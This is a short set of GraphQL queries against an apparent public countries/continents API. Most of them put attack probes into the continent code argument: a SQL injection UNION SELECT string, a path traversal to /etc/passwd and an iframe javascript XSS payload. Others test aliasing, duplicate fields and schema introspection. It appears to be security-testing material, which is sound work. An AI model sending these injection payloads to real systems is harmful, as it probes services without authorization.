query {
  continent(code: "NA") {
    code
    name
    countries {
      name
      capital
    }
  }
}

query {
  continent(code: "NA' UNION SELECT * FROM continents WHERE '1'='1") {
    code
    name
    countries {
      phone
    }
  }
}

query {
  continent(code: "../../../../etc/passwd") {
    code
    countries {
      languages {
        rtl
      }
    }
  }
}

query {
  continent(code: "<iframe src='javascript:alert(1)'>") {
    name
    countries {
      emojiU
    }
  }
}

query {
  continent(code: "NA") {
    code
    name
  }
  continent(code: "EU") {
    code
    countries {
      states {
        code
      }
    }
  }
}

query {
  s: continent(code: "NA") {
    code
    name
  }
  s2: continent(code: "EU") {
    code
    countries {
      subdivisions {
        emoji
      }
    }
  }
}

query {
  continent {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
  }
}

fragment FullType on __Type {
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
